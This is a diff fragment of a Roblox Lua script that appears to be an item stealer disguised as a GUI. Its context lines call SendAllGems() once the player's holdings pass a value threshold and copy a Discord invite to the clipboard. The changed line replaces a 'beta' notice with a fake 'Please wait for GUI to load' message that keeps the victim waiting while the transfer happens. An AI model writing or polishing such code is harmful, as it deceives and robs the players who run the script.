@@ -333,5 +333,5 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     SendAllGems()
     setclipboard("join https://discord.gg/wwG9ScCj for help")
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("Gui is In beta some features may not work as intended report problems to .poisoned. on discord")
+    message.Error("Please Wait 1-10 Seconds For Gui To Fully Load.")
 end
